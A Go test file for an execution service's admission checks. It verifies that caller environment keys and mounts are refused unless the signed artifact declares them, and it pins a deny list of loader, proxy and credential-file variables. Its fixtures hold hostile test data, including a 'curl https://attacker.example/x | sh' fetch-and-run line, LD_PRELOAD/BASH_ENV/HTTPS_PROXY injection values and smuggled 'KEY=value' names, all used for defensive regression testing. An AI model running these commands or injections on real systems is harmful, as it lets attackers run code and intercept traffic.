package admission

import (
	"context"
	"io"
	"net/http"
	"sort"
	"strings"
	"sync"
	"testing"
)

// These tests hold the rule that the artifact's signed runtime interface is
// the only source of what a caller may set or mount
// (.docs/execution_lifecycle/contracts.md, section 5): an empty environment
// allowlist admits no caller key, a declared key is admitted only if ES does
// not reserve it, a caller key must be a portable name, and a caller mount is
// admitted only at a target the artifact declares.

// withMountTargets returns a copy of the fixture whose signed runtime
// interface declares exactly these mount targets, sealed again with the
// fixture's own key.
func (f preparedArtifactFixture) withMountTargets(t *testing.T, targets ...string) preparedArtifactFixture {
	t.Helper()
	f.evidence.Claims.Admission.Execution.Runtime.MountTargets = append([]string(nil), targets...)
	return f.resealed(t)
}

// withEnvironmentVariables returns a copy of the fixture whose signed runtime
// interface declares exactly these environment keys. nil leaves the list
// absent from the served record's value, which canonicalizes like an empty
// list.
func (f preparedArtifactFixture) withEnvironmentVariables(t *testing.T, keys []string) preparedArtifactFixture {
	t.Helper()
	f.evidence.Claims.Admission.Execution.Runtime.EnvironmentVariables = keys
	return f.resealed(t)
}

// callerDeclarationHarness runs one request through Prepare and through
// Submit against a fixture and reports what reached Nomad and staging.
type callerDeclarationHarness struct {
	t       *testing.T
	fixture preparedArtifactFixture
	payload []byte
	mount   *preparedArtifactFixture
	archive []byte
}

type callerDeclarationOutcome struct {
	prepareErr  *Error
	submitErr   *Error
	submitted   bool
	job         string
	nomadCalls  int
	mountReads  int
	payloadRead int
	stagingRoot string
	resultsRoot string
}

func (h callerDeclarationHarness) run(request PrepareRequest) callerDeclarationOutcome {
	t := h.t
	t.Helper()
	var outcome callerDeclarationOutcome

	newService := func() (*Service, *signedPayloadHandler, string, string) {
		service, stagingRoot, resultsRoot := newWorkstreamCTestService(t, h.fixture)
		service.admissionPolicyEvaluator = payloadBlindAdmissionPolicy{}
		handler := newSignedPayloadHandler(t, h.fixture, h.payload)
		if h.mount != nil {
			handler = handler.withMount(*h.mount, h.archive)
		}
		service.arsClient = newResolvedPlanDependencyClient(t, handler)
		return service, handler, stagingRoot, resultsRoot
	}

	prepareService, _, _, _ := newService()
	prepareService.nomadClient = newResolvedPlanNomadClient(t, http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		t.Error(":prepare reached Nomad")
	}))
	_, outcome.prepareErr = prepareService.Prepare(context.Background(), cloneCallerDeclarationRequest(request))

	submitService, handler, stagingRoot, resultsRoot := newService()
	var mu sync.Mutex
	submitService.nomadClient = newResolvedPlanNomadClient(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		mu.Lock()
		outcome.nomadCalls++
		outcome.job += string(body)
		mu.Unlock()
		_, _ = w.Write([]byte(`{"EvalID":"eval-caller-declaration"}`))
	}))
	submitRequest := cloneCallerDeclarationRequest(request)
	submitRequest.Mode = ExecutionModeAsync
	result, submitErr := submitService.Submit(context.Background(), submitRequest)
	outcome.submitErr = submitErr
	outcome.submitted = result.Submitted
	if h.mount != nil {
		outcome.mountReads = handler.log.count("/v1/artifacts/" + h.mount.discovery.Artifact.ArtifactDigest + "/discovery")
	}
	outcome.payloadRead = handler.log.count("/v1/blobs/" + h.fixture.discovery.Payload.Digest + ":bytes")
	outcome.stagingRoot, outcome.resultsRoot = stagingRoot, resultsRoot
	return outcome
}

func cloneCallerDeclarationRequest(request PrepareRequest) PrepareRequest {
	cloned := request
	if request.Invocation.Env != nil {
		cloned.Invocation.Env = make(map[string]string, len(request.Invocation.Env))
		for key, value := range request.Invocation.Env {
			cloned.Invocation.Env[key] = value
		}
	}
	cloned.Invocation.Mounts = append([]RuntimeMount(nil), request.Invocation.Mounts...)
	return cloned
}

// refusedBeforeAnyEffect asserts that both Prepare and Submit refused the
// request with 400 invalid_request and a message containing want, and that
// Submit read neither the payload nor a mount artifact, staged nothing and
// sent nothing to Nomad.
func (o callerDeclarationOutcome) refusedBeforeAnyEffect(t *testing.T, want string) {
	t.Helper()
	for name, err := range map[string]*Error{"prepare": o.prepareErr, "submit": o.submitErr} {
		assertAdmissionError(t, err, http.StatusBadRequest, codeInvalidRequest)
		if !strings.Contains(err.Message, want) {
			t.Fatalf("%s refusal message %q does not contain %q", name, err.Message, want)
		}
	}
	if o.submitted || o.nomadCalls != 0 || o.mountReads != 0 || o.payloadRead != 0 {
		t.Fatalf("refused request had effects: submitted=%v nomad=%d mount reads=%d payload reads=%d", o.submitted, o.nomadCalls, o.mountReads, o.payloadRead)
	}
	assertDirectoryEmpty(t, o.stagingRoot)
	assertDirectoryEmpty(t, o.resultsRoot)
}

func (o callerDeclarationOutcome) admitted(t *testing.T) {
	t.Helper()
	if o.prepareErr != nil || o.submitErr != nil || !o.submitted || o.nomadCalls != 1 {
		t.Fatalf("expected the request to be admitted: prepare=%+v submit=%+v submitted=%v nomad=%d", o.prepareErr, o.submitErr, o.submitted, o.nomadCalls)
	}
}

func baseCallerDeclarationRequest(fixture preparedArtifactFixture) PrepareRequest {
	request := fixture.prepareRequest()
	request.Invocation.Env = nil
	return request
}

func TestEmptyEnvironmentAllowlistAdmitsNoCallerKey(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	for name, keys := range map[string][]string{"empty list": {}, "absent list": nil} {
		t.Run(name, func(t *testing.T) {
			fixture := base.withEnvironmentVariables(t, keys)
			harness := callerDeclarationHarness{t: t, fixture: fixture, payload: payload}

			harness.run(baseCallerDeclarationRequest(fixture)).admitted(t)

			for _, key := range []string{"APP_MODE", "WORKLOAD_VAULT_SECRET_PATH", "A"} {
				request := baseCallerDeclarationRequest(fixture)
				request.Invocation.Env = map[string]string{key: "1"}
				harness.run(request).refusedBeforeAnyEffect(t, "environment key is not allowed by the runtime interface: "+key)
			}
		})
	}
}

func TestDeclaredEnvironmentKeyIsTheOnlyCallerKeyAdmitted(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	fixture := base.withEnvironmentVariables(t, []string{" APP_MODE "})
	harness := callerDeclarationHarness{t: t, fixture: fixture, payload: payload}

	request := baseCallerDeclarationRequest(fixture)
	request.Invocation.Env = map[string]string{"APP_MODE": "test"}
	outcome := harness.run(request)
	outcome.admitted(t)
	if !strings.Contains(outcome.job, `"APP_MODE":"test"`) {
		t.Fatalf("declared key did not reach the job: %s", outcome.job)
	}

	for _, key := range []string{"APP_MODE_2", "app_mode", "OTHER"} {
		request := baseCallerDeclarationRequest(fixture)
		request.Invocation.Env = map[string]string{"APP_MODE": "test", key: "x"}
		harness.run(request).refusedBeforeAnyEffect(t, "environment key is not allowed by the runtime interface: "+key)
	}
}

// mustBeReservedEnvironmentKeys pins the keys a caller may never set. With the
// prefix and suffix lists below it is the list in reservedRuntimeEnvKeys,
// reservedRuntimeEnvPrefixes and reservedRuntimeEnvSuffixes, written out again
// so that a change to that list is a deliberate change to this one.
var mustBeReservedEnvironmentKeys = []string{
	// ES runtime keys.
	"PROJECT_NAME", "ENVIRONMENT", "PLATFORM", "GUID", "SERVICE_ID", "SESSION_ID", "PARENT_SESSION_ID",
	"TRACEPARENT", "EXEC_SVID_PATH", "VAULT_AGENT_TOKEN_PATH", "VAULT_ADDR", "VAULT_CACERT",
	"VAULT_NAMESPACE", "SSL_CERT_FILE", "EXEC_WORKLOAD_IDENTITY_ENDPOINT",
	// glibc unsecvars.h.
	"GCONV_PATH", "GETCONF_DIR", "GLIBC_TUNABLES", "HOSTALIASES", "LOCALDOMAIN", "LOCPATH",
	"MALLOC_ARENA_MAX", "MALLOC_ARENA_TEST", "MALLOC_MMAP_MAX_", "MALLOC_MMAP_THRESHOLD_",
	"MALLOC_PERTURB_", "MALLOC_TOP_PAD_", "MALLOC_TRACE", "MALLOC_TRIM_THRESHOLD_", "NIS_PATH",
	"NLSPATH", "RESOLV_HOST_CONF", "RES_OPTIONS", "TMPDIR", "TZDIR",
	// sudo 1.9.16p2 initial_badenv_table (Linux entries) and the entries
	// sudo's development branch adds after it.
	"IFS", "CDPATH", "PATH_LOCALE", "KRB5_KTNAME", "TERMINFO", "TERMINFO_DIRS", "TERMPATH",
	"TERMCAP", "ENV", "BASH_ENV", "PS4", "GLOBIGNORE", "BASHOPTS", "SHELLOPTS", "JAVA_TOOL_OPTIONS",
	"_JAVA_OPTIONS", "CLASSPATH", "PERLIO_DEBUG", "PERLLIB", "PERL5LIB", "PERL5OPT", "PERL5DB",
	"FPATH", "NULLCMD", "READNULLCMD", "ZDOTDIR", "TMPPREFIX", "RUBYLIB", "RUBYOPT",
	"NODE_OPTIONS", "NODE_PATH",
	// Program lookup, per-user startup files and the Java launcher.
	"PATH", "HOME", "JDK_JAVA_OPTIONS",
	// Proxies and TLS trust.
	"HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "FTP_PROXY", "NO_PROXY", "SSL_CERT_DIR",
	"REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "NODE_EXTRA_CA_CERTS", "NODE_TLS_REJECT_UNAUTHORIZED",
	"SSLKEYLOGFILE",
	// Keys of the same kinds that no list above names and no prefix covers
	// (red-team report 19 and re-check 23 on PR #74).
	"WORKLOAD_VAULT_INSECURE_SKIP_VERIFY", "WGETRC", "NETRC", "AWS_CONFIG_FILE",
	"AWS_SHARED_CREDENTIALS_FILE", "AWS_CA_BUNDLE", "KUBECONFIG", "GNUPGHOME", "WS_PROXY", "WSS_PROXY",
	"RSYNC_PROXY", "SOCKS_PROXY", "NODE_REPL_EXTERNAL_MODULE", "NODE_COMPILE_CACHE", "NODE_ICU_DATA",
	"NODE_V8_COVERAGE", "NODE_REDIRECT_WARNINGS", "NODE_REPL_HISTORY", "OPENJ9_JAVA_OPTIONS",
	"IBM_JAVA_OPTIONS", "VIRTUAL_ENV", "DJANGO_SETTINGS_MODULE", "SHELL", "PAGER", "MANPAGER", "EDITOR",
	"VISUAL", "BROWSER", "SUDO_ASKPASS", "R_PROFILE", "R_PROFILE_USER", "R_ENVIRON", "R_ENVIRON_USER",
	"R_LIBS", "R_LIBS_USER", "R_LIBS_SITE", "TCLLIBPATH", "MAKEFLAGS", "MFLAGS", "GNUMAKEFLAGS",
	"MAKEFILES", "TAR_OPTIONS", "LESSOPEN", "LESSCLOSE", "CC", "CXX", "CPP", "LD", "AR", "AS", "CFLAGS",
	"CXXFLAGS", "CPPFLAGS", "LDFLAGS", "RUSTFLAGS", "RUSTDOC", "RUSTDOCFLAGS", "GODEBUG", "GOTRACEBACK",
	"GOFLAGS", "GOENV", "GOTOOLCHAIN", "GOPROXY", "GONOPROXY", "GOPRIVATE", "GOINSECURE", "GOSUMDB",
	"GONOSUMDB", "GONOSUMCHECK", "GOROOT", "GOPATH", "GOBIN", "GOCACHE", "GOCACHEPROG", "GOMODCACHE",
	"GOWORK", "GOAUTH", "GOVCS", "GOEXPERIMENT", "GOTMPDIR", "GCCGO", "GCCGOTOOLDIR", "FC",
	"GCC_EXEC_PREFIX", "COMPILER_PATH", "LIBRARY_PATH", "CPATH", "C_INCLUDE_PATH", "CPLUS_INCLUDE_PATH",
	"OBJC_INCLUDE_PATH", "GCC_COMPARE_DEBUG", "LPATH", "OBJCPLUS_INCLUDE_PATH", "DEPENDENCIES_OUTPUT",
	"SUNPRO_DEPENDENCIES", "TEXTDOMAINDIR", "TEXTDOMAIN", "LANGUAGE",
}

var mustBeReservedEnvironmentPrefixes = []string{
	"EXEC_", "EXEC_WORKLOAD_VAULT_", "LD_", "_RLD", "KRB5_CONFIG", "PYTHON", "GIT_", "BASH_FUNC_",
	"VAULT_", "XDG_", "OPENSSL_", "NPM_CONFIG_", "NOMAD_", "CODEX_", "OPENAI_", "PIP_", "PYTEST_",
	"PERL", "RUBY", "GEM_", "BUNDLE_", "JAVA_", "MAVEN_", "GRADLE_", "DOTNET_", "CORECLR_", "COMPLUS_",
	"PHP", "LUA_", "CARGO_", "RUSTUP_", "RUSTC", "CGO_", "PKG_CONFIG", "DOCKER_", "SSH_", "GRPC_", "CURL_",
}

var mustBeReservedEnvironmentSuffixes = []string{"INSECURE_SKIP_VERIFY"}

// redTeam74FamilyKeys are the keys red-team report 19 on PR #74 found
// admitted when a package declared them. Each is now reserved by name or by
// family. Of the others it listed, TEXTDOMAINDIR and LANGUAGE are reserved by
// name since re-check 23 and report 24 (see
// TestReservedEnvironmentKeySetIsPinned), and the five that stay unreserved
// are in TestOrdinaryEnvironmentKeysAreNotReserved.
var redTeam74FamilyKeys = []string{
	"XDG_CONFIG_HOME", "XDG_CONFIG_DIRS", "XDG_DATA_HOME", "XDG_DATA_DIRS", "XDG_CACHE_HOME",
	"VAULT_AGENT_ADDR", "VAULT_PROXY_ADDR", "VAULT_HTTP_PROXY", "VAULT_SKIP_VERIFY", "VAULT_TLS_SERVER_NAME",
	"VAULT_CAPATH", "VAULT_CLIENT_CERT", "VAULT_CLIENT_KEY", "VAULT_TOKEN",
	"OPENSSL_CONF", "OPENSSL_MODULES", "OPENSSL_ENGINES", "AWS_CA_BUNDLE", "PIP_CERT",
	"GRPC_DEFAULT_SSL_ROOTS_FILE_PATH", "PERL_LWP_SSL_VERIFY_HOSTNAME",
	"WS_PROXY", "WSS_PROXY", "RSYNC_PROXY", "GRPC_PROXY", "CURL_HOME", "WGETRC", "NETRC",
	"RUBYGEMS_GEMDEPS", "GEM_PATH", "GEM_HOME", "BUNDLE_GEMFILE",
	"NODE_REPL_EXTERNAL_MODULE", "NODE_COMPILE_CACHE", "NPM_CONFIG_SCRIPT_SHELL", "npm_config_script_shell",
	"NPM_CONFIG_USERCONFIG",
	"JAVA_HOME", "OPENJ9_JAVA_OPTIONS", "IBM_JAVA_OPTIONS", "MAVEN_OPTS", "GRADLE_OPTS",
	"PIP_INDEX_URL", "PIP_CONFIG_FILE", "VIRTUAL_ENV", "PYTEST_ADDOPTS", "DJANGO_SETTINGS_MODULE",
	"PERL_USE_UNSAFE_INC", "PERL_MM_OPT", "PERL_MB_OPT",
	"SSH_ASKPASS", "PAGER", "EDITOR", "VISUAL",
	"DOTNET_STARTUP_HOOKS", "CORECLR_PROFILER_PATH", "PHPRC", "PHP_INI_SCAN_DIR", "LUA_INIT", "LUA_PATH",
	"LUA_CPATH", "R_PROFILE_USER", "TCLLIBPATH",
	"MAKEFLAGS", "MAKEFILES", "GNUMAKEFLAGS", "TAR_OPTIONS", "LESSOPEN", "CC", "RUSTC_WRAPPER", "GOFLAGS",
	"AWS_CONFIG_FILE", "KUBECONFIG", "DOCKER_CONFIG", "GNUPGHOME",
	"GODEBUG", "GOTRACEBACK",
	"WORKLOAD_VAULT_INSECURE_SKIP_VERIFY",
	"CODEX_HOME", "OPENAI_BASE_URL",
	"NOMAD_TOKEN", "NOMAD_ADDR", "NOMAD_SECRETS_DIR", "NOMAD_TASK_DIR", "NOMAD_ALLOC_DIR", "NOMAD_ALLOC_ID",
	"NOMAD_META_run_id",
}

func TestReservedFamiliesCoverTheKeysTheRedTeamFoundOpen(t *testing.T) {
	if len(redTeam74FamilyKeys) != 87 {
		t.Fatalf("expected the 87 keys report 19 found open and this repair reserves, got %d", len(redTeam74FamilyKeys))
	}
	for _, key := range redTeam74FamilyKeys {
		if !isReservedRuntimeEnvKey(key) {
			t.Errorf("%q is not reserved", key)
		}
	}
}

func TestReservedEnvironmentKeySetIsPinned(t *testing.T) {
	got := make([]string, 0, len(reservedRuntimeEnvKeys))
	for key := range reservedRuntimeEnvKeys {
		got = append(got, key)
	}
	want := append([]string(nil), mustBeReservedEnvironmentKeys...)
	sort.Strings(got)
	sort.Strings(want)
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("reserved environment keys changed:\n got %v\nwant %v", got, want)
	}
	if strings.Join(reservedRuntimeEnvPrefixes, ",") != strings.Join(mustBeReservedEnvironmentPrefixes, ",") {
		t.Fatalf("reserved environment prefixes changed:\n got %v\nwant %v", reservedRuntimeEnvPrefixes, mustBeReservedEnvironmentPrefixes)
	}
	if strings.Join(reservedRuntimeEnvSuffixes, ",") != strings.Join(mustBeReservedEnvironmentSuffixes, ",") {
		t.Fatalf("reserved environment suffixes changed:\n got %v\nwant %v", reservedRuntimeEnvSuffixes, mustBeReservedEnvironmentSuffixes)
	}
	entries := append(append([]string(nil), mustBeReservedEnvironmentKeys...), mustBeReservedEnvironmentPrefixes...)
	for _, key := range append(entries, mustBeReservedEnvironmentSuffixes...) {
		if key != asciiUpper(key) {
			t.Fatalf("reserved entry %q must be written in upper case, the form it is matched in", key)
		}
	}
}

// reservedEnvironmentProbeKeys returns every pinned key and a key under every
// pinned prefix, each in its own case, in lower case and in mixed case, keeping
// only portable names.
func reservedEnvironmentProbeKeys() []string {
	seen := map[string]bool{}
	var keys []string
	add := func(key string) {
		if isPortableEnvironmentKey(key) && !seen[key] {
			seen[key] = true
			keys = append(keys, key)
		}
	}
	bases := append([]string(nil), mustBeReservedEnvironmentKeys...)
	for _, prefix := range mustBeReservedEnvironmentPrefixes {
		bases = append(bases, prefix+"X1")
	}
	for _, suffix := range mustBeReservedEnvironmentSuffixes {
		bases = append(bases, suffix, "X1_"+suffix)
	}
	for _, key := range bases {
		add(key)
		add(strings.ToLower(key))
		mixed := []byte(strings.ToLower(key))
		for index := 0; index < len(mixed); index += 2 {
			mixed[index] = asciiUpper(string(mixed[index]))[0]
		}
		add(string(mixed))
	}
	return keys
}

func TestReservedEnvironmentKeysAreRefusedEvenWhenTheArtifactDeclaresThem(t *testing.T) {
	keys := reservedEnvironmentProbeKeys()
	if len(keys) < 3*len(mustBeReservedEnvironmentKeys) {
		t.Fatalf("expected upper, lower and mixed-case probes, got %d keys", len(keys))
	}
	for _, key := range keys {
		if !isReservedRuntimeEnvKey(key) {
			t.Fatalf("%q is not reserved", key)
		}
	}

	// End to end on a sample of each family, with the key declared.
	base, payload := signedStaticScriptFixture(t)
	for _, key := range []string{
		"LD_PRELOAD", "ld_library_path", "LD_AUDIT", "PATH", "BASH_ENV", "ENV", "HTTPS_PROXY", "http_proxy",
		"HOME", "PYTHONPATH", "PYTHONSTARTUP", "GIT_SSH_COMMAND", "GIT_CONFIG_COUNT", "NODE_OPTIONS",
		"GLIBC_TUNABLES", "GCONV_PATH", "SHELLOPTS", "PS4", "BASH_FUNC_X", "SSL_CERT_DIR",
		"REQUESTS_CA_BUNDLE", "VAULT_ADDR", "traceparent", "Exec_Run_ID",
		"WORKLOAD_VAULT_INSECURE_SKIP_VERIFY", "VAULT_SKIP_VERIFY", "XDG_CONFIG_HOME", "OPENSSL_CONF",
		"npm_config_script_shell", "NOMAD_TOKEN", "OPENAI_BASE_URL", "CODEX_HOME", "PIP_INDEX_URL",
		"GEM_HOME", "JAVA_HOME", "DOTNET_STARTUP_HOOKS", "PHPRC", "LUA_INIT", "CARGO_HOME", "RUSTC_WRAPPER",
		"DOCKER_CONFIG", "SSH_ASKPASS", "CURL_HOME", "GODEBUG", "EDITOR", "MAKEFLAGS", "KUBECONFIG",
		// Re-check 23 on PR #74: bash's translation directory and domain, and
		// any TLS-skip switch named like Go's InsecureSkipVerify, including
		// the one the legacy reference workload reads.
		"TEXTDOMAINDIR", "textdomain", "Language", "REFERENCE_VAULT_INSECURE_SKIP_VERIFY",
		"reference_vault_insecure_skip_verify", "INSECURE_SKIP_VERIFY", "App_Tls_Insecure_Skip_Verify",
		// Go and gcc keys that change what runs or gets built (re-check 23).
		"GOCACHEPROG", "GOAUTH", "GOROOT", "GOWORK", "cgo_cflags", "CGO_LDFLAGS", "GCC_EXEC_PREFIX",
		"COMPILER_PATH", "CPATH",
		// Re-check 25: the rest of the go command's and gcc's keys of these
		// kinds, and pkg-config's search keys.
		"FC", "PKG_CONFIG", "pkg_config_path", "PKG_CONFIG_LIBDIR", "GCCGOTOOLDIR", "LPATH",
		"OBJCPLUS_INCLUDE_PATH", "DEPENDENCIES_OUTPUT", "SUNPRO_DEPENDENCIES",
	} {
		t.Run(key, func(t *testing.T) {
			fixture := base.withEnvironmentVariables(t, []string{key})
			request := baseCallerDeclarationRequest(fixture)
			request.Invocation.Env = map[string]string{key: "/execution/mounts/x/attacker"}
			callerDeclarationHarness{t: t, fixture: fixture, payload: payload}.run(request).
				refusedBeforeAnyEffect(t, "environment key is reserved for runtime identity or control-plane use: "+key)
		})
	}
}

func TestOrdinaryEnvironmentKeysAreNotReserved(t *testing.T) {
	for _, key := range []string{
		"APP_MODE", "WORKLOAD_VAULT_SECRET_PATH", "REFERENCE_SECRET_PATH", "REFERENCE_IDENTITY_URL",
		"NODE_ENV", "LANG", "TZ", "PATHNAME", "HOMEPAGE", "ENVIRONMENT_NAME", "LDAP_URL", "GITHUB_REF",
		"PYTHO", "_X",
		// Near misses: the TLS-skip rule is a suffix, and TEXTDOMAIN, GOROOT
		// and CPATH are exact keys.
		"SKIP_VERIFY", "INSECURE_SKIP_VERIFY_NOTE", "TEXTDOMAIN_LABEL", "GOROOT_LABEL", "CPATHS", "CGO",
		// Go keys that choose only among code the artifact already holds or
		// tune the Go runtime, and gcc keys that change only text it prints.
		"GOOS", "GOARCH", "GO111MODULE", "GOFIPS140", "SOURCE_DATE_EPOCH", "GCC_EXTRA_DIAGNOSTIC_OUTPUT",
		// Report 19 on PR #74 listed these. LANG and LC_ALL select only
		// installed locales: glibc refuses a locale name that climbs out of
		// the locale directory and looks a name up only under that directory
		// unless LOCPATH, which is reserved, is set (locale/findlocale.c).
		// GOMEMLIMIT, GOGC and GOMAXPROCS tune the Go runtime. None of them
		// loads code, so they stay available to a publisher that declares
		// them.
		"LC_ALL", "GOMEMLIMIT", "GOGC", "GOMAXPROCS",
	} {
		if isReservedRuntimeEnvKey(key) {
			t.Fatalf("%q should not be reserved", key)
		}
	}
}

func TestCallerEnvironmentKeyMustBeAPortableName(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	for _, key := range []string{
		// An equals sign ends the name in the environment string the
		// container receives, so this would set VAULT_ADDR or SSL_CERT_FILE
		// past the reserved-key check.
		"VAULT_ADDR=https://attacker.example/?x",
		"SSL_CERT_FILE=/execution/mounts/x/ca.pem",
		"LD_PRELOAD=/execution/mounts/x/preload.so ",
		// Bash's exported-function form.
		"BASH_FUNC_python3%%",
		"", "1ABC", "A-B", "A.B", " APP_MODE", "APP_MODE ", "APP MODE", "APP\tMODE", "ÄPP_MODE", "APP_MODE\u200b",
	} {
		t.Run(key, func(t *testing.T) {
			// Declaring the exact key does not make it admissible.
			fixture := base.withEnvironmentVariables(t, []string{key})
			request := baseCallerDeclarationRequest(fixture)
			request.Invocation.Env = map[string]string{key: ""}
			callerDeclarationHarness{t: t, fixture: fixture, payload: payload}.run(request).
				refusedBeforeAnyEffect(t, "environment key must be ASCII letters, digits and underscores, not starting with a digit")
		})
	}
	for _, key := range []string{"A", "_", "_A1", "a_b", "APP_MODE2"} {
		if !isPortableEnvironmentKey(key) {
			t.Fatalf("%q should be a portable name", key)
		}
	}
}

func TestEnvironmentRefusalNamesTheFirstKeyInOrder(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	fixture := base.withEnvironmentVariables(t, []string{})
	request := baseCallerDeclarationRequest(fixture)
	request.Invocation.Env = map[string]string{"ZZ": "1", "MM": "1", "AA": "1", "QQ": "1"}
	for attempt := 0; attempt < 20; attempt++ {
		callerDeclarationHarness{t: t, fixture: fixture, payload: payload}.run(request).
			refusedBeforeAnyEffect(t, "environment key is not allowed by the runtime interface: AA")
	}
}

func callerDeclarationMount(t *testing.T, fixture preparedArtifactFixture, principal string) (preparedArtifactFixture, []byte) {
	t.Helper()
	archive := mustRuntimeMountArchiveBytes(t,
		runtimeMountArchiveEntry{name: "preload.so", body: []byte("\x7fELF caller code"), typeflag: '0', mode: 0o755},
		runtimeMountArchiveEntry{name: "rc", body: []byte("curl https://attacker.example/x | sh\n"), typeflag: '0', mode: 0o755},
		runtimeMountArchiveEntry{name: "python3", body: []byte("#!/bin/sh\ncurl https://attacker.example/x | sh\n"), typeflag: '0', mode: 0o755},
	)
	mount := fixture.withPayload(t, archive)
	mount.evidence.Claims.Admission.Execution.Runtime.MountTargets = nil
	mount.evidence.Claims.Package.Publication.Invoker.Principal = principal
	mount.evidence.Claims.Package.Publication.Invoker.Service = strings.TrimPrefix(principal, "spiffe://execution.internal/")
	mount.evidence.Claims.Admission.Execution.Access.NetworkAccess = false
	return mount.resealed(t), archive
}

func TestCallerMountNeedsATargetTheArtifactDeclares(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	mountRequest := func(fixture, mount preparedArtifactFixture, targets ...string) PrepareRequest {
		request := baseCallerDeclarationRequest(fixture)
		for _, target := range targets {
			request.Invocation.Mounts = append(request.Invocation.Mounts, RuntimeMount{
				Source:     MountSource{ArtifactDigest: mount.discovery.Artifact.ArtifactDigest},
				TargetPath: target,
				ReadOnly:   true,
			})
		}
		return request
	}

	t.Run("no declaration admits no mount", func(t *testing.T) {
		mount, archive := callerDeclarationMount(t, base, "spiffe://execution.internal/operator/local")
		harness := callerDeclarationHarness{t: t, fixture: base, payload: payload, mount: &mount, archive: archive}
		for _, target := range []string{"/execution/mounts/config", "/execution/mounts/x"} {
			harness.run(mountRequest(base, mount, target)).refusedBeforeAnyEffect(t, "mount target_path is not declared by the runtime interface: "+target)
		}
	})

	t.Run("declared target only", func(t *testing.T) {
		fixture := base.withMountTargets(t, "/execution/mounts/config", " /execution/mounts/data ")
		mount, archive := callerDeclarationMount(t, fixture, "spiffe://execution.internal/user/mallory")
		harness := callerDeclarationHarness{t: t, fixture: fixture, payload: payload, mount: &mount, archive: archive}

		outcome := harness.run(mountRequest(fixture, mount, "/execution/mounts/config", "/execution/mounts/data"))
		outcome.admitted(t)
		if outcome.mountReads != 2 || !strings.Contains(outcome.job, `"target":"/execution/mounts/config"`) || !strings.Contains(outcome.job, `"target":"/execution/mounts/data"`) {
			t.Fatalf("declared mounts did not reach the job (mount reads %d): %s", outcome.mountReads, outcome.job)
		}

		for _, target := range []string{"/execution/mounts/other", "/execution/mounts/config/sub", "/execution/mounts/Config", "/execution/mounts/con"} {
			harness.run(mountRequest(fixture, mount, "/execution/mounts/data", target)).
				refusedBeforeAnyEffect(t, "mount target_path is not declared by the runtime interface: "+target)
		}
	})
}

// TestCallerCannotPutItsOwnCodeIntoAGrantedNetworkRun is red-team finding
// RT73-4 (reports/Execution-Substrate/workload-identity/11-pr73-redteam.md)
// as a permanent regression test. The artifact requests the network and
// declares no environment key and no mount target, as the Control Plane
// normal-shell example does. Before this rule, ES registered a bridge-network
// job with the caller's LD_PRELOAD, BASH_ENV, ENV, PATH and HTTPS_PROXY,
// pointing into files a different principal published and the caller
// mounted.
func TestCallerCannotPutItsOwnCodeIntoAGrantedNetworkRun(t *testing.T) {
	base, payload := signedStaticScriptFixture(t)
	fixture := base.withEnvironmentVariables(t, []string{})
	if !fixture.evidence.Claims.Admission.Execution.Access.NetworkAccess {
		t.Fatal("the attacked artifact must request the network")
	}
	mount, archive := callerDeclarationMount(t, fixture, "spiffe://execution.internal/user/mallory")
	harness := callerDeclarationHarness{t: t, fixture: fixture, payload: payload, mount: &mount, archive: archive}
	attack := map[string]string{
		"LD_PRELOAD":  "/execution/mounts/x/preload.so",
		"BASH_ENV":    "/execution/mounts/x/rc",
		"ENV":         "/execution/mounts/x/rc",
		"PATH":        "/execution/mounts/x:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		"HTTPS_PROXY": "http://attacker.example:8080",
	}
	xMount := []RuntimeMount{{Source: MountSource{ArtifactDigest: mount.discovery.Artifact.ArtifactDigest}, TargetPath: "/execution/mounts/x", ReadOnly: true}}

	request := baseCallerDeclarationRequest(fixture)
	request.Invocation.Env = attack
	request.Invocation.Mounts = xMount
	outcome := harness.run(request)
	if outcome.prepareErr == nil || outcome.submitErr == nil || outcome.submitted || outcome.nomadCalls != 0 || outcome.mountReads != 0 {
		t.Fatalf("the composite attack was not refused before any effect: %+v", outcome)
	}
	assertDirectoryEmpty(t, outcome.stagingRoot)

	// Each piece alone is refused too.
	for key, value := range attack {
		request := baseCallerDeclarationRequest(fixture)
		request.Invocation.Env = map[string]string{key: value}
		harness.run(request).refusedBeforeAnyEffect(t, "environment key is reserved for runtime identity or control-plane use: "+key)
	}
	request = baseCallerDeclarationRequest(fixture)
	request.Invocation.Mounts = xMount
	harness.run(request).refusedBeforeAnyEffect(t, "mount target_path is not declared by the runtime interface: /execution/mounts/x")

	// A publisher that declares the loader keys and the mount still does not
	// open the loader keys: they are reserved whatever the artifact says.
	declaring := fixture.withEnvironmentVariables(t, []string{"LD_PRELOAD", "BASH_ENV", "ENV", "PATH", "HTTPS_PROXY"}).withMountTargets(t, "/execution/mounts/x")
	declaringMount, declaringArchive := callerDeclarationMount(t, declaring, "spiffe://execution.internal/user/mallory")
	declaringHarness := callerDeclarationHarness{t: t, fixture: declaring, payload: payload, mount: &declaringMount, archive: declaringArchive}
	request = baseCallerDeclarationRequest(declaring)
	request.Invocation.Env = attack
	request.Invocation.Mounts = []RuntimeMount{{Source: MountSource{ArtifactDigest: declaringMount.discovery.Artifact.ArtifactDigest}, TargetPath: "/execution/mounts/x", ReadOnly: true}}
	declaringHarness.run(request).refusedBeforeAnyEffect(t, "environment key is reserved for runtime identity or control-plane use: BASH_ENV")
}
